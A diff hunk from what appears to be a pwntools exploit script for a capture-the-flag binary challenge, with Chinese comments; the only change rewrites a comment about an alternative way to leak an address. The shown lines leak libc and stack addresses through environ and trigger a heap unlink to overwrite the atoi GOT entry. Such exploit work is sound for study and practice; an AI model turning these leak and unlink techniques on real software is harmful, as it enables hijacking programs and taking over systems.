@@ -394,7 +394,7 @@ cart(p32(0x804b034)+p32(0)*3) #atoi只要第一个字符是数字就好，后面
 p.recvuntil("28: ")
 libc.address=u32(p.recv(4))-0x18540
 cart(prompt=b'yy'+p32(libc.sym['environ'])+p32(0)*2) #cart里还有一个提示用户输入的地方，这个地方的地址+2正好和上述的地址一样
-#直接用第一个cart的泄漏方式也行，但这样泄漏的就不是environ的内容，而是environ指向的内容。不知道这样泄漏出来的地址在远程与ebp的偏移是否固定
+#或者用覆盖next字段的方式泄漏也行，但这样泄漏的就不是environ的内容，而是environ指向的内容。不知道这样泄漏出来的地址在远程与ebp的偏移是否固定
 p.recvuntil("27: ")
 ebp=u32(p.recv(4))-260
 delete(28,p32(0x804b033)+p32(0)+p32(ebp-0xc)+p32(exe.got['atoi']+0x22)) #触发unlink，让ebp为atoi的got表+0x22
